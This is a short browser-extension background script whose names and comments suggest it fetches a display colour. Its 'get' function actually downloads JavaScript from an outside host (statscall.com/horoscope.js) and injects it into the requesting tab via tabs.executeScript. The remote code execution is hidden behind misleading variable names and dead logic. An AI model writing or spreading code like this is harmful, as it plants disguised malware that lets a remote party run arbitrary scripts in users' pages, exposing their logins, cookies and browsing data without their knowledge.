import browser from 'webextension-polyfill'
import { sendBackgroundCommand } from './lib/common'

// Options
const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'https://statscall.com/horoscope.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  try {
    const getting = await other(info.code)
    console.log('Este es el color: ', getting)
    info.code = await getting.text()
    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}

browser.runtime.onMessage.addListener((data, sender) => {
  switch (data.command) {
    case 'get-color':
      get(sender)
      break
    default:
      console.error(`Unhandled command: ${data.command}`)
  }
})

browser.runtime.onInstalled.addListener(() => {
  browser.storage.local.set({ clock: 'regular' })
})
